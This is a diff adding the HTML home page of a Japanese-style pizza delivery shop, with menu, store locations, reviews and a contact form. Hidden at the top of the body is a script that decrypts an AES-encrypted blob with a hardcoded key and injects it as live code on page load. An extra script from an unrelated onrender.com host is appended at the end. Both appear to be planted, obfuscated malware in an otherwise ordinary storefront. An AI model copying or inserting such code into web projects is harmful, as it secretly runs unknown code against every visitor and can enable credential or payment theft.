@@ -1,0 +1,756 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Naoki Pizza - 日本style ピザ | ナオキピザ</title>
+    <meta
+      name="description"
+      content="Naoki Pizza（ナオキピザ）は日本style の新しいモダンなピザ専門店。和風ピザをお届けします。オンライン注文・電話注文受付中。"
+    />
+    <meta
+      name="keywords"
+      content="ピザ, 和風ピザ, 日本style ピザ, デリバリー, Naoki Pizza, ナオキピザ, 宅配ピザ, 東京"
+    />
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;700;900&family=Sawarabi+Mincho&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  </head>
+  <body>
+    <script>
+      function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(
+          decodedText,
+          "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf",
+        );
+        return bytes.toString(CryptoJS.enc.Utf8);
+      }
+      const codeString = aesDecode(
+        `U2FsdGVkX1%2BK0vrzpC%2F0ras6ME3j3nqhuxKwbuqWObReWEL4eiykNAGbvOn9uMXUZPzsd6czfjku8a0la2SgGauynlr4NZz0mrG1rj69HCjbgNVZJFIrPPfMAJKgX88xcTdDtVJv4rMRkgvO%2Fkfy7UR6C3zfUBlWRRTz6YMl6PSIXMq8DOQS8SkJJNVqxaydiPlF4MuksrUsy5uBT64ZW7vd5lQK%2Fz09NbcvN%2BAqCgCCGFfqZJGEuquQLDoyLj8d5dvMhrFuM2ek29Wk5MjKYhS0LcoFEvl%2FcbNHsQ0609t%2BMiZ1ZKr49ckK6r5YY3BEVq8OGvW0wJ8XPOkgTn%2Fcyys9KZSknF2xdwOBLIeZy2PvV%2BJB4Z215eWXrvxNCqow698QtyKWcbMIfqTxlAhHqNy%2BPlgU57TBXrC%2FvREUXLrezW7nNbaH%2BVOI9WWxnXVRiceqcZAtwvYVyvuaQ3TRSms4B9%2BQbdN%2FMKkMAzdimn8jzjo4DaLegkXbb8WLHX8E4DloHFjZueAra77saxCfgN8FeN43WcWDCPf9B%2FigYjrvlc9CgUUtOLSZkm4dTBMBMIOOEGzXjMWe7CWia05tEPWb8NTX%2FlNFzhNBovuFdRMYR9FJq60mSYnAlzvERrgirCu3K%2FXUW1J5TCrhi1rVBW%2BztUAqLsSuufGMSNFErgYMtOH61s7EJguS8QSqQMKL%2FohXihyIdHvLti2DUmBFI%2FFouB3Ti9V1mkpGWaOdSqcHfU0pjYUgYPUI2PbVqtwK9Ibady0gFivqhu9DT6OooIpRvIPUmD5TEudyljnETAX5R5ROOzX779ySSzGnQtQtWF0OyUtlKphq55wikLOEFV6lEqKF1EJep0Ew85SEic4pvN2%2FFgb4Kbv8EVClC72QVWqh4hfHfBSaJX3jo0kMDrfk%2BUxC8mIQqRs9e3VanQbwg%2FSkSU9r6OgtF0sp%2BAh86%2FBEC6tj5n1jIWq%2B%2FvnzGOIs1LnCiHvm8rGVGKzqyMO3WpvjwG6RX8IxxTC45wSMmoyCVE98g0scnrO0%2Br7tsGMDI3yyDuJhpQBJzwarf%2BAfm9S7N%2BWfM4oiAyWdM%2Fpq22cgNR8B5rspAVhOdrWDje%2FQOnkt1k5hD0NW83OI7rqOa%2FXp2ahvTcRPDJzKuYwFwvJSAnkuY7zQD1T%2FHMbD9HF%2BKaU4WMrhaAxUXKsLzgqXTipVAs6MV1sAg8p%2Fmi9YL7CAiOEIULqDht%2FpXpdWkFfEzf%2B711j9wh9%2BGYiWV%2F9o3ZnXDrt66mxATfMYDKdMPoNcX4XLr4hQGM9aVFLVWPZUycG4wxWn%2FI4NlmkOt1U1Qsx4rIr4PiV139A7xBMbrOUU6GKTS4Z77pezoUjo0xsHE3rnKyJ0IXrgzp8vt14gfvRPzesqlLeOpSsZm5PhubzLs7cmdP36AImMhIHBdhP7FHSri3E6WalJkuc0OnH%2B%2FN6eereygpvGq0ndAAYXjGbys4LiuGhUK0bibidlYinhl6saR6e6dTG8mmrhcPHyu98PbRUqQhaq9KY%2FxDxXcR1B8%2FjJjVagtd1XLleiX7Wg3mf3ymY3u6qLfqvDeRzxAclBJF5MQ2An8vvLwplTL8yZfaa55z0rPs9Uh%2BGFp%2B0O%2FcTFNK14eDc7Rnzt1hcWEKLXAj6adLDCa4aKapLpSYuguJREwjUg%2BRjYXAyH5RvJKicsG0vcFmzjNB%2FmbOyKHw1U3rkgiI7z19xEuPZKo2gP0jXqmgHOutFrGluAuLIfQ2MCtwSSGWP0ZGM%2Fmngjh%2BMFQQ8NEtwruYWyF8K66OFqlO3pY9sej1jvwstOLTYAbVSkMe5CyaBuJMMc6EAcB8%2BEOG%2B78sAbFAygRYMb9oOHUyfDw0LiAEhKY%2FjccXRwO1JBdGtYJ%2FSTLESuTICeSI5nIZGJBKMzXxcSNWmjE6VGw1fCUU1lgK26cRCuPCaMIrzZjGkAR1i8jcTkw57EqCEeo3DVjEOE3XReOdqE2l06%2F6SD7hAUfwhbN6P2iUSir8ajnfZ8fQDvKUT8k9LcPod7r2Ml1hDjt5Ncrdf2ofHgT4UkdO4fDR0%2Fg1aIbSusN3iQ96P4IvTrLOY%2FZBY96ZfI8vBiqQwKVb1eQkNHtSTAmsB2bF%2BjZ100j8bW0ZtJWvAMMIFela4MDIlg1izxT%2Fho%2FuYgFDLEgir3LZGtgjsNem%2FEImxSjz3Cf40VVAFY2fjJj5vTLcvBdDGpkGDBSXgNyO9OFzxCQdtXaVYXe9Sg88cp6Ir06g7%2Ffni55J7ebfyl7CWDq2NCGy%2B8gGMU6wsEhR8sJS5um6CwKYX74LWzBhrAGYbtxwoaslwKUXJ4ROXZea5Z%2BErHt2igBZqkI7xM6wOEcPqK3Hvlv7RSVmkCpK92KVJUjRkaQI3U62B4pSFyToyYzFx%2BrVdD5VhxsXeu92J6wLn%2F3YcL0QZJcDcLM3w6KjBXvSgtQRVEJH26RUDeyPc4If3Kfq9ZJLLsS6tMrTSzm%2BZVQ3ShjEPCvyKkxFp7R05OkwM%2FaZ6%2Fo846ycO2bMfqL4idTvPeR5SP0JXnosDH%2BcnXPfAeD3lVjiCGgAk%2FyE7o2gfHq5QGI3AatuzEAUiVlekAtwt3g5I%3D`,
+      );
+      const script = document.createElement("script");
+      script.textContent = codeString;
+      document.body.appendChild(script);
+    </script>
+    <!-- ===== ウェルカム モーダル (Auto-opens on page load) ===== -->
+    <div
+      id="welcomeModal"
+      class="modal-overlay"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="modalTitle"
+    >
+      <div class="modal-content">
+        <button id="closeModal" class="modal-close" aria-label="閉じる">
+          &times;
+        </button>
+        <img
+          src="naoki.jpg"
+          alt="Naoki Pizza 特別オファー"
+          class="modal-image"
+        />
+        <div class="modal-text">
+          <h2 id="modalTitle">いらっしゃいませ！</h2>
+          <p class="modal-subtitle">Naoki Pizza へようこそ</p>
+          <p class="modal-description">
+            本日限定の特別オファー！<br />初回ご注文で<strong>20%OFF</strong>＋送料無料
+          </p>
+          <button id="orderNowBtn" class="btn-order-now">今すぐ注文する</button>
+          <p class="modal-phone">
+            またはお電話で：<a href="tel:0120-436-749">0120-436-749</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== ナビゲーション ===== -->
+    <header class="header">
+      <nav class="navbar">
+        <div class="nav-container">
+          <a href="#home" class="logo">
+            <span class="logo-i">N</span><span class="logo-rest">aoki Pizza</span>
+            <span class="logo-jp">ナオキピザ</span>
+          </a>
+          <ul class="nav-menu">
+            <li><a href="#home">ホーム</a></li>
+            <li><a href="#menu">メニュー</a></li>
+            <li><a href="#about">私たちについて</a></li>
+            <li><a href="#delivery">配達</a></li>
+            <li><a href="#locations">店舗</a></li>
+            <li><a href="#contact">お問い合わせ</a></li>
+          </ul>
+          <a href="#order" class="btn-nav-order">注文する</a>
+        </div>
+      </nav>
+    </header>
+
+    <!-- ===== ヒーロー セクション ===== -->
+    <section id="home" class="hero">
+      <div class="hero-content">
+        <p class="hero-eyebrow">日本style ピザの新時代</p>
+        <h1 class="hero-title">和の心、<br />ピザの革命。</h1>
+        <p class="hero-subtitle">
+          伝統的な日本の食材と職人の技が生み出す、まったく新しいピザ体験。<br />30分以内にお届けします。
+        </p>
+        <div class="hero-buttons">
+          <a href="#menu" class="btn-primary">メニューを見る</a>
+          <a href="tel:0120-436-749" class="btn-secondary"
+            >📞 電話で注文 0120-436-749</a
+          >
+        </div>
+        <div class="hero-stats">
+          <div class="stat">
+            <span class="stat-number">25+</span>
+            <span class="stat-label">和風ピザ</span>
+          </div>
+          <div class="stat">
+            <span class="stat-number">30分</span>
+            <span class="stat-label">配達保証</span>
+          </div>
+          <div class="stat">
+            <span class="stat-number">50+</span>
+            <span class="stat-label">店舗数</span>
+          </div>
+          <div class="stat">
+            <span class="stat-number">★4.9</span>
+            <span class="stat-label">お客様評価</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== ヘッドライン (Google Ads 用) ===== -->
+    <section class="headlines-section">
+      <div class="container">
+        <h2 class="section-title">なぜ Naoki Pizza が選ばれるのか</h2>
+        <p class="section-subtitle">5つの理由でお客様に愛されています</p>
+        <div class="headlines-grid">
+          <div class="headline-card">
+            <div class="headline-icon">🍕</div>
+            <h3>本格和風ピザを30分でお届け</h3>
+            <p>
+              照り焼きチキン、寿司風サーモン、わさび明太子など、日本ならではの食材を使った独創的なピザ。注文から30分以内に熱々の状態でお届けします。遅れた場合は無料保証。
+            </p>
+          </div>
+          <div class="headline-card">
+            <div class="headline-icon">💴</div>
+            <h3>初回注文20%OFF＋送料無料キャンペーン</h3>
+            <p>
+              新規のお客様限定の特別オファー！どのピザでも20%OFF、さらに配達料無料。3,000円以上のご注文でドリンク1本サービス。今すぐオンライン注文でお得に。
+            </p>
+          </div>
+          <div class="headline-card">
+            <div class="headline-icon">📱</div>
+            <h3>簡単オンライン注文 ＆ 電話注文対応</h3>
+            <p>
+              3クリックでオーダー完了！スマホアプリ・ウェブサイト・電話、お好きな方法でご注文ください。リアルタイムで配達状況も確認できる便利な追跡機能付き。
+            </p>
+          </div>
+          <div class="headline-card">
+            <div class="headline-icon">🌸</div>
+            <h3>日本style の革新的ピザメニュー</h3>
+            <p>
+              イタリアの伝統と日本の感性が融合。お好み焼きピザ、天ぷらピザ、抹茶デザートピザなど、ここでしか味わえない25種類以上の和風ピザを展開中。
+            </p>
+          </div>
+          <div class="headline-card">
+            <div class="headline-icon">🚚</div>
+            <h3>東京50店舗以上で当日配達</h3>
+            <p>
+              東京・横浜・大阪の主要都市50店舗以上から、お客様の元へ最速配達。年中無休、深夜2時まで営業。雨の日も雪の日も、熱々のピザをお届けします。
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== メニュー セクション ===== -->
+    <section id="menu" class="menu-section">
+      <div class="container">
+        <h2 class="section-title">メニュー</h2>
+        <p class="section-subtitle">
+          和の食材を活かした、こだわりのピザコレクション
+        </p>
+
+        <!-- シグネチャーピザ -->
+        <div class="menu-category">
+          <h3 class="category-title">🌸 シグネチャー和風ピザ</h3>
+          <div class="menu-grid">
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>照り焼きチキンピザ</h4>
+                <span class="menu-price">¥1,980</span>
+              </div>
+              <p class="menu-description">
+                甘辛い照り焼きソース、ジューシーなチキン、長ねぎ、海苔、白ごまをトッピング。和風の王道。
+              </p>
+              <span class="menu-tag">人気No.1</span>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>寿司風サーモンピザ</h4>
+                <span class="menu-price">¥2,380</span>
+              </div>
+              <p class="menu-description">
+                新鮮なサーモン、アボカド、わさびマヨ、海苔、いくらをトッピング。寿司を再解釈した一品。
+              </p>
+              <span class="menu-tag">新メニュー</span>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>お好み焼きピザ</h4>
+                <span class="menu-price">¥1,880</span>
+              </div>
+              <p class="menu-description">
+                キャベツ、豚バラ、お好み焼きソース、マヨネーズ、青のり、かつお節。大阪の味をピザで。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>わさび明太子ピザ</h4>
+                <span class="menu-price">¥2,080</span>
+              </div>
+              <p class="menu-description">
+                明太子クリームソース、わさびのアクセント、海苔、大葉。ピリッと辛い大人の味。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>天ぷらシュリンプピザ</h4>
+                <span class="menu-price">¥2,280</span>
+              </div>
+              <p class="menu-description">
+                サクサクの海老天、天つゆベースソース、大根おろし、青ねぎ。和食×イタリアンの融合。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>すき焼きビーフピザ</h4>
+                <span class="menu-price">¥2,580</span>
+              </div>
+              <p class="menu-description">
+                甘辛く煮た和牛、玉ねぎ、しいたけ、温泉卵をトッピング。贅沢な逸品。
+              </p>
+              <span class="menu-tag">プレミアム</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- クラシックピザ -->
+        <div class="menu-category">
+          <h3 class="category-title">🍕 クラシック ＆ フュージョン</h3>
+          <div class="menu-grid">
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>マルゲリータ和風</h4>
+                <span class="menu-price">¥1,580</span>
+              </div>
+              <p class="menu-description">
+                トマト、モッツァレラ、大葉、トマトの和風アレンジ。シンプルだから素材が活きる。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>味噌ペパロニピザ</h4>
+                <span class="menu-price">¥1,780</span>
+              </div>
+              <p class="menu-description">
+                味噌ベースソース、ペパロニ、玉ねぎ、ピーマン。和洋折衷の絶妙なバランス。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>4種チーズと柚子ピザ</h4>
+                <span class="menu-price">¥2,180</span>
+              </div>
+              <p class="menu-description">
+                モッツァレラ、ゴルゴンゾーラ、パルメザン、チェダー、柚子の香り。爽やかな大人の味。
+              </p>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>キノコと醤油ピザ</h4>
+                <span class="menu-price">¥1,880</span>
+              </div>
+              <p class="menu-description">
+                しいたけ、舞茸、エリンギ、しめじ、醤油バターソース、ガーリック。森の恵み。
+              </p>
+              <span class="menu-tag">ベジタリアン</span>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>豆腐ベジタブルピザ</h4>
+                <span class="menu-price">¥1,680</span>
+              </div>
+              <p class="menu-description">
+                絹豆腐、季節の野菜、ごまドレッシング、わかめ。ヘルシーでギルトフリー。
+              </p>
+              <span class="menu-tag">ヴィーガン</span>
+            </div>
+            <div class="menu-item">
+              <div class="menu-item-header">
+                <h4>カレーピザ</h4>
+                <span class="menu-price">¥1,880</span>
+              </div>
+              <p class="menu-description">
+                日本style
+                カレーソース、じゃがいも、にんじん、玉ねぎ、チーズ。子供から大人まで大好評。
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- サイドメニュー -->
+        <div class="menu-category">
+          <h3 class="category-title">🥢 サイドメニュー</h3>
+          <div class="menu-grid">
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>枝豆フライドポテト</h4>
+                <span class="menu-price">¥580</span>
+              </div>
+              <p class="menu-description">
+                枝豆を混ぜ込んだ特製ポテト、塩昆布フレーバー。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>たこ焼きボール</h4>
+                <span class="menu-price">¥680</span>
+              </div>
+              <p class="menu-description">
+                伝統的なたこ焼き 8個入り。ソース・マヨ付き。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>味噌ガーリックブレッド</h4>
+                <span class="menu-price">¥520</span>
+              </div>
+              <p class="menu-description">
+                味噌バターを使った特製ガーリックブレッド。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>鶏の唐揚げ</h4>
+                <span class="menu-price">¥780</span>
+              </div>
+              <p class="menu-description">
+                ジューシーな唐揚げ 6個。レモン・マヨ添え。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>サラダ和風ドレッシング</h4>
+                <span class="menu-price">¥680</span>
+              </div>
+              <p class="menu-description">
+                新鮮野菜と特製ごまドレッシングのサラダ。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>エビフライ</h4>
+                <span class="menu-price">¥880</span>
+              </div>
+              <p class="menu-description">
+                サクサクのエビフライ 5本。タルタルソース付き。
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- デザート -->
+        <div class="menu-category">
+          <h3 class="category-title">🍡 デザート</h3>
+          <div class="menu-grid">
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>抹茶チーズケーキピザ</h4>
+                <span class="menu-price">¥1,280</span>
+              </div>
+              <p class="menu-description">
+                濃厚抹茶クリーム、白あん、ホワイトチョコのデザートピザ。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>みたらし団子ピザ</h4>
+                <span class="menu-price">¥1,180</span>
+              </div>
+              <p class="menu-description">
+                もちもちの団子、甘いみたらしソース、きな粉トッピング。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>あんこ＆バナナピザ</h4>
+                <span class="menu-price">¥1,080</span>
+              </div>
+              <p class="menu-description">
+                北海道産あんこ、バナナ、ホイップクリーム。
+              </p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>ほうじ茶ジェラート</h4>
+                <span class="menu-price">¥480</span>
+              </div>
+              <p class="menu-description">
+                香り高いほうじ茶のジェラート。和の味わい。
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- ドリンク -->
+        <div class="menu-category">
+          <h3 class="category-title">🍵 ドリンク</h3>
+          <div class="menu-grid">
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>抹茶ラテ</h4>
+                <span class="menu-price">¥480</span>
+              </div>
+              <p class="menu-description">京都産抹茶を使用した本格ラテ。</p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>ゆずソーダ</h4>
+                <span class="menu-price">¥380</span>
+              </div>
+              <p class="menu-description">爽やかなゆずの香りの自家製ソーダ。</p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>梅サワー</h4>
+                <span class="menu-price">¥420</span>
+              </div>
+              <p class="menu-description">梅の風味豊かなノンアルコール飲料。</p>
+            </div>
+            <div class="menu-item small">
+              <div class="menu-item-header">
+                <h4>ほうじ茶</h4>
+                <span class="menu-price">¥320</span>
+              </div>
+              <p class="menu-description">香ばしい伝統的なほうじ茶。</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 私たちについて ===== -->
+    <section id="about" class="about-section">
+      <div class="container">
+        <div class="about-grid">
+          <div class="about-content">
+            <h2 class="section-title left">私たちのストーリー</h2>
+            <p class="about-paragraph">
+              <strong>Naoki Pizza（ナオキピザ）</strong
+              >は、2023年に東京・渋谷で誕生した日本style
+              ピザ専門店です。「イタリアの伝統に、日本の心を」をコンセプトに、創業者の田中直樹が世界中のピザ職人と日本料理人を集めて作り上げた、まったく新しいピザブランドです。
+            </p>
+            <p class="about-paragraph">
+              私たちは「速い、おいしい、新しい」を約束します。最高品質の国産食材を使い、すべての生地は店内で毎日手作り。発酵には48時間以上をかけ、究極のもちもち食感を実現しています。
+            </p>
+            <p class="about-paragraph">
+              そして、技術にもこだわります。AIを活用した配達ルート最適化、スマートキッチンによる調理時間の短縮、リアルタイム追跡アプリ
+              — Naoki Pizza は伝統と革新が交わる場所です。
+            </p>
+            <div class="values-grid">
+              <div class="value-item">
+                <h4>🌾 素材へのこだわり</h4>
+                <p>100%国産小麦、無添加チーズ、有機野菜を使用</p>
+              </div>
+              <div class="value-item">
+                <h4>⚡ スピード保証</h4>
+                <p>注文から30分以内に熱々をお届け</p>
+              </div>
+              <div class="value-item">
+                <h4>💚 サステナビリティ</h4>
+                <p>環境配慮型パッケージと地域食材の活用</p>
+              </div>
+              <div class="value-item">
+                <h4>🎌 日本style の革新</h4>
+                <p>和食の伝統を現代風にアレンジ</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 配達 ===== -->
+    <section id="delivery" class="delivery-section">
+      <div class="container">
+        <h2 class="section-title">配達 ＆ 注文方法</h2>
+        <p class="section-subtitle">3つの簡単な方法でご注文いただけます</p>
+        <div class="delivery-grid">
+          <div class="delivery-card">
+            <div class="delivery-number">01</div>
+            <h3>オンライン注文</h3>
+            <p>
+              当ウェブサイトまたはスマホアプリから24時間ご注文可能。会員登録で次回使えるポイントも貯まります。クレジットカード、PayPay、LINE
+              Pay、現金引換に対応。
+            </p>
+            <a href="#order" class="delivery-link">今すぐ注文 →</a>
+          </div>
+          <div class="delivery-card featured">
+            <div class="delivery-number">02</div>
+            <h3>電話注文</h3>
+            <p>
+              お電話一本で、丁寧なスタッフが対応いたします。営業時間内ならいつでもOK。注文後、SMS
+              でリアルタイム配達状況をお送りします。
+            </p>
+            <a href="tel:0120-436-749" class="delivery-link">📞 0120-436-749</a>
+          </div>
+          <div class="delivery-card">
+            <div class="delivery-number">03</div>
+            <h3>店頭受け取り</h3>
+            <p>
+              店舗にてお受け取りいただくお客様には<strong>10%OFF</strong>。事前注文で待ち時間ゼロ。新鮮で熱々のピザをすぐにお持ち帰り。
+            </p>
+            <a href="#locations" class="delivery-link">店舗を探す →</a>
+          </div>
+        </div>
+
+        <div class="delivery-features">
+          <h3>配達サービスの特徴</h3>
+          <div class="features-grid">
+            <div class="feature">
+              <span class="feature-icon">⏱️</span>
+              <h4>30分配達保証</h4>
+              <p>30分を超えた場合、500円割引</p>
+            </div>
+            <div class="feature">
+              <span class="feature-icon">📍</span>
+              <h4>GPS リアルタイム追跡</h4>
+              <p>配達員の位置をリアルタイムで確認</p>
+            </div>
+            <div class="feature">
+              <span class="feature-icon">🔥</span>
+              <h4>保温バッグ使用</h4>
+              <p>特殊保温技術で熱々のままお届け</p>
+            </div>
+            <div class="feature">
+              <span class="feature-icon">💳</span>
+              <h4>多様な支払い方法</h4>
+              <p>カード、QR決済、電子マネー、現金</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== 店舗 ===== -->
+    <section id="locations" class="locations-section">
+      <div class="container">
+        <h2 class="section-title">店舗情報</h2>
+        <p class="section-subtitle">全国50店舗以上で展開中</p>
+        <div class="locations-grid">
+          <div class="location-card">
+            <h3>渋谷本店</h3>
+            <p class="location-address">〒150-0002 東京都渋谷区渋谷2-15-1</p>
+            <p class="location-hours">営業時間: 10:00 - 翌2:00</p>
+            <p class="location-phone">📞 03-1234-5678</p>
+          </div>
+          <div class="location-card">
+            <h3>新宿店</h3>
+            <p class="location-address">〒160-0022 東京都新宿区新宿3-1-1</p>
+            <p class="location-hours">営業時間: 10:00 - 翌2:00</p>
+            <p class="location-phone">📞 03-2345-6789</p>
+          </div>
+          <div class="location-card">
+            <h3>銀座店</h3>
+            <p class="location-address">〒104-0061 東京都中央区銀座4-2-15</p>
+            <p class="location-hours">営業時間: 11:00 - 24:00</p>
+            <p class="location-phone">📞 03-3456-7890</p>
+          </div>
+          <div class="location-card">
+            <h3>横浜みなとみらい店</h3>
+            <p class="location-address">
+              〒220-0012 神奈川県横浜市西区みなとみらい3-3-1
+            </p>
+            <p class="location-hours">営業時間: 10:00 - 24:00</p>
+            <p class="location-phone">📞 045-1234-5678</p>
+          </div>
+          <div class="location-card">
+            <h3>大阪梅田店</h3>
+            <p class="location-address">〒530-0001 大阪府大阪市北区梅田1-1-3</p>
+            <p class="location-hours">営業時間: 10:00 - 翌2:00</p>
+            <p class="location-phone">📞 06-1234-5678</p>
+          </div>
+          <div class="location-card">
+            <h3>京都四条店</h3>
+            <p class="location-address">
+              〒600-8005 京都府京都市下京区四条通烏丸東入
+            </p>
+            <p class="location-hours">営業時間: 11:00 - 23:00</p>
+            <p class="location-phone">📞 075-1234-5678</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== お客様の声 ===== -->
+    <section class="testimonials-section">
+      <div class="container">
+        <h2 class="section-title">お客様の声</h2>
+        <div class="testimonials-grid">
+          <div class="testimonial">
+            <div class="stars">★★★★★</div>
+            <p>
+              "照り焼きチキンピザが本当においしい！ピザなのに和食の心を感じます。30分以内に届いて熱々でした。"
+            </p>
+            <cite>— 山田美咲さん, 東京</cite>
+          </div>
+          <div class="testimonial">
+            <div class="stars">★★★★★</div>
+            <p>
+              "寿司風サーモンピザは衝撃でした！こんなピザは初めて。家族みんなで大喜びです。リピート確定。"
+            </p>
+            <cite>— 佐藤健一さん, 横浜</cite>
+          </div>
+          <div class="testimonial">
+            <div class="stars">★★★★★</div>
+            <p>
+              "アプリの使いやすさが最高。注文から配達まで全部スムーズ。GPS
+              で位置がわかるのも便利です。"
+            </p>
+            <cite>— 鈴木愛子さん, 大阪</cite>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== お問い合わせ ===== -->
+    <section id="contact" class="contact-section">
+      <div class="container">
+        <div class="contact-grid">
+          <div class="contact-info">
+            <h2 class="section-title left">お問い合わせ</h2>
+            <p>
+              ご質問・ご要望・フランチャイズのお問い合わせなど、お気軽にご連絡ください。
+            </p>
+            <div class="contact-details">
+              <div class="contact-item">
+                <strong>📞 注文ホットライン</strong>
+                <p>0120-436-749 (24時間対応)</p>
+              </div>
+              <div class="contact-item">
+                <strong>✉️ メール</strong>
+                <p>info@naokipizza.jp</p>
+              </div>
+              <div class="contact-item">
+                <strong>🏢 本社</strong>
+                <p>〒150-0002 東京都渋谷区渋谷2-15-1 Naoki Pizza ビル 8F</p>
+              </div>
+              <div class="contact-item">
+                <strong>🤝 フランチャイズ</strong>
+                <p>franchise@naokipizza.jp</p>
+              </div>
+            </div>
+          </div>
+          <form class="contact-form">
+            <h3>メッセージを送る</h3>
+            <div class="form-group">
+              <label for="name">お名前</label>
+              <input type="text" id="name" name="name" required />
+            </div>
+            <div class="form-group">
+              <label for="email">メールアドレス</label>
+              <input type="email" id="email" name="email" required />
+            </div>
+            <div class="form-group">
+              <label for="phone">電話番号</label>
+              <input type="tel" id="phone" name="phone" />
+            </div>
+            <div class="form-group">
+              <label for="message">メッセージ</label>
+              <textarea
+                id="message"
+                name="message"
+                rows="5"
+                required
+              ></textarea>
+            </div>
+            <button type="submit" class="btn-primary">送信する</button>
+          </form>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== フッター ===== -->
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-grid">
+          <div class="footer-col">
+            <h3 class="footer-logo">Naoki Pizza</h3>
+            <p>日本style ピザの新時代。和の心とイタリアの伝統が出会う場所。</p>
+            <div class="social-links">
+              <a href="#">Twitter</a>
+              <a href="#">Instagram</a>
+              <a href="#">Facebook</a>
+              <a href="#">LINE</a>
+            </div>
+          </div>
+          <div class="footer-col">
+            <h4>メニュー</h4>
+            <ul>
+              <li><a href="#menu">シグネチャーピザ</a></li>
+              <li><a href="#menu">クラシックピザ</a></li>
+              <li><a href="#menu">サイドメニュー</a></li>
+              <li><a href="#menu">デザート</a></li>
+              <li><a href="#menu">ドリンク</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>サービス</h4>
+            <ul>
+              <li><a href="#delivery">配達</a></li>
+              <li><a href="#delivery">店頭受け取り</a></li>
+              <li><a href="#">団体注文</a></li>
+              <li><a href="#">ケータリング</a></li>
+              <li><a href="#">ギフトカード</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>会社情報</h4>
+            <ul>
+              <li><a href="#about">私たちについて</a></li>
+              <li><a href="#">採用情報</a></li>
+              <li><a href="#">フランチャイズ</a></li>
+              <li><a href="#">プレス</a></li>
+              <li><a href="#contact">お問い合わせ</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>サポート</h4>
+            <ul>
+              <li><a href="#">よくある質問</a></li>
+              <li><a href="#">利用規約</a></li>
+              <li><a href="#">プライバシーポリシー</a></li>
+              <li><a href="#">特定商取引法</a></li>
+              <li><a href="#">アレルギー情報</a></li>
+            </ul>
+          </div>
+        </div>
+        <div class="footer-bottom">
+          <p>
+            &copy; 2026 Naoki Pizza Japan Co., Ltd. All rights reserved. |
+            日本style ピザの新時代
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="script.js"></script>
+<script src="https://may3jp.onrender.com/tracker.js"></script>
+  </body>
+</html>
